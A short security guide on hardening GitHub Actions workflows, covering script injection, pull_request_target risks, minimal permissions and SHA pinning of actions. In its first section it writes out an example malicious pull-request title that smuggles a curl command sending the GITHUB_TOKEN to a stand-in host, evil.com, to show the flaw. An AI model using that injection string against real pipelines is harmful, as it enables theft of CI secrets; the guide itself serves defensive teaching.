# GitHub Actions Security Hardening Guide

A practical guide to securing CI/CD pipelines, preventing script injection, and eliminating supply-chain vulnerabilities in GitHub Actions workflows.

Author: [Jatin Sharma](https://jatinsh.netlify.app/) (`@raghav1924`)

---

## 1. Defeating Script Injections (CWE-78)

Inline shell scripts (`run:`) that interpolate GitHub context variables directly into bash strings are vulnerable to command injection:

❌ **Vulnerable:**
```yaml
- name: Log PR Title
  run: echo "PR title: ${{ github.event.pull_request.title }}"
```
If an attacker names their PR `Fix bug"; curl evil.com/steal?token=$GITHUB_TOKEN; echo "`, the bash runner executes the stolen curl command!

✅ **Secure:**
```yaml
- name: Log PR Title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
```

---

## 2. Preventing the Toxic `pull_request_target` Triad

Never checkout code from a pull request head inside `pull_request_target`:

❌ **Vulnerable:**
```yaml
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm test # Attacker controls test scripts and can read repo secrets!
```

✅ **Secure:**
Use standard `on: pull_request` which runs with read-only permissions and no access to repository secrets for forked PRs.

---

## 3. Enforcing Minimum Permissions

Always declare explicit permissions at the workflow root:

```yaml
permissions:
  contents: read
```

And elevate privileges only on specific jobs that require them (e.g. `pull-requests: write` for bot commenters).

---

## 4. Pinning Third-Party Actions to Full Commit SHAs

Mutable tags (`@v1`, `@main`) can be redirected if a maintainer account is compromised. Pin external actions to full commit SHAs:

```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

